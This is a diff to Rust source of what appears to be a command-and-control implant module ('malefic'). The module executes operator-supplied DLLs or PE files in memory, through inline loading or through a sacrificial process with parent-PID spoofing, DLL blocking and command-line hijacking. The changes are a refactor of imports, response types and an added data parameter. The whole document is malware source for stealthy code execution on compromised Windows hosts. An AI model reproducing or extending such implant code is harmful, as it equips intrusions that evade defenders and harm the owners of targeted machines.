@@ -1,15 +1,15 @@
-use std::{convert::TryFrom, ptr::null};
+#![allow(unused_assignments)]
+use std::ptr::null;
 
 use async_trait::async_trait;
+use malefic_proto::proto::implantpb::spite::Body;
 use malefic_helper::win::kit::pe::{inlinepe::inline_pe, runpe::run_pe};
 
-use crate::{check_request, to_error, Module, Result, TaskResult};
-use malefic_helper::{
-    common::format_cmdline,
-    protobuf::implantpb::{Arch, AssemblyResponse, spite::Body},
-};
-
+use crate::{check_request, Module, Result, TaskResult};
+use malefic_helper::common::format_cmdline;
+use malefic_proto::proto::modulepb::BinaryResponse;
 use malefic_trait::module_impl;
+use crate::execute::Arch;
 
 pub struct ExecuteDll {}
 
@@ -21,10 +21,10 @@ impl Module for ExecuteDll {
         let request = check_request!(receiver, Body::ExecuteBinary)?;
         let timeout = request.timeout;
         let need_output = request.output;
-        let is_x86 = matches!(Arch::try_from(request.arch).unwrap_or(Arch::X8664), Arch::I686);
+        let is_x86 = matches!(Arch::from_u32(request.arch), Some(Arch::I686));
         let entrypoint = request.entry_point;
+        let data = request.data;
         let mut result: Vec<u8> = Vec::new();
-
         if let Some(sacrifice) = request.sacrifice {
             let cmdline = format_cmdline(request.process_name, request.args);
             let argue = sacrifice.argue;
@@ -39,13 +39,14 @@ impl Module for ExecuteDll {
                     hijack_commandline.as_bytes(),
                     &request.bin,
                     entrypoint.as_bytes(),
+                    &data,
                     is_x86,
                     sacrifice.ppid,
                     sacrifice.block_dll,
                     request.output);
             }
         } else {
-            let par = if request.args.is_empty() {
+            let cmdline = if request.args.is_empty() {
                 String::new()
             } else {
                 format_cmdline(request.process_name, request.args)
@@ -57,8 +58,8 @@ impl Module for ExecuteDll {
                     request.bin.len(),
                     null(),
                     null(),
-                    par.as_ptr() as _,
-                    par.len(),
+                    cmdline.as_ptr() as _,
+                    cmdline.len(),
                     entrypoint.as_ptr() as _,
                     entrypoint.len(),
                     true,
@@ -68,8 +69,9 @@ impl Module for ExecuteDll {
             }
         }
 
-        Ok(TaskResult::new_with_body(id, Body::AssemblyResponse(AssemblyResponse{
+        Ok(TaskResult::new_with_body(id, Body::BinaryResponse(BinaryResponse{
             status: 0,
+            message: Vec::new(),
             data: result,
             err: "".to_string(),
         })))
